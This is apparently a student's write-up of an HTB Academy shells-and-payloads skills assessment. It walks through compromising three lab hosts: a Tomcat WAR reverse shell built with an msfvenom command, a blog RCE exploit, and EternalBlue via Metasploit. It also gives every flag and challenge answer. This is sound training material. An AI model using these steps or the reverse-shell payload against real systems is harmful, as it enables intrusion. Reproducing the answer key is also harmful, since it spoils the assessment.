## Scenario:
CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your `Pwnbox`, we will need to `RDP` into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.

## Objectives

- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Windows host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Linux host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Web application`.
- Demonstrate your ability to identify the `shell environment` you have access to as a user on the victim host.

Complete the objectives by answering the challenge questions `below`.

## Credentials and Other Needed Info:
Foothold:
- Credentials: `htb-student` / HTB_@cademy_stdnt! Can be used by RDP.

## Connectivity To The Foothold
Accessing the Skills Assessment lab environment will require the use of [XfreeRDP](https://manpages.ubuntu.com/manpages/trusty/man1/xfreerdp.1.html) to provide GUI access to the virtual machine. We will be connecting to the Academy lab like normal utilizing your own VM with a HTB Academy `VPN key` or the `Pwnbox` built into the module section. You can start the `FreeRDP` client on the Pwnbox by typing the following into your shell once the target spawns:

```bash
xfreerdp /v:<target IP> /u:htb-student /p:HTB_@cademy_stdnt!
```

Once you initiate the connection, you will be required to enter the provided credentials again in the window you see below:
![[Pasted image 20250927152026.png]]

Enter your credentials again and click `OK` and you will be connected to the provided Parrot Linux desktop instance.
#### Target Hosts

![[Pasted image 20250927152039.png]]

Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts.

IP in inlanefreight network: 
### Questions

1. What is the hostname of Host-1? (Format: all lower case)

2.  Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)

3. What distribution of Linux is running on Host-2? (Format: distro name, all lower case)

4.  What language is the shell written in that gets uploaded when using the 50064.rb exploit?

5. Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt

6. What is the hostname of Host-3?

7.  Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt

```shell
HOST 1:
Open burp suite to get a browser and go to ip:8080
Go to server-status and enter this default creds:
tomcat:Tomcatadm

Go to List Applications a upload a war reverse shell:
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=443 -f war > shell.war
Set up a listener on port 443 and then upload the file and click on it to execute.

We get a shell.

Answer 1: shells-winsvr
Answer 2: dev-share
```


```shell
HOST 2:
Gobuster and find a directory named data where we find a config file with credentials.
Then use it to connect to the blog. We can now abuse of the RCE mentionned in the blog with metasploit. (50064.rb)

Answer 3: Ubuntu
Answer 4: php
Answer 5: B1nD_Shells_r_cool
```


```shell
HOST 3:
I found that 172.16.1.13 is vulnerable to EternalBlue exploit.
Just use Metasploit psexec module to get a meterpreter.

Answer 6: shells-winblue
Answer 7: One-H0st-Down!
```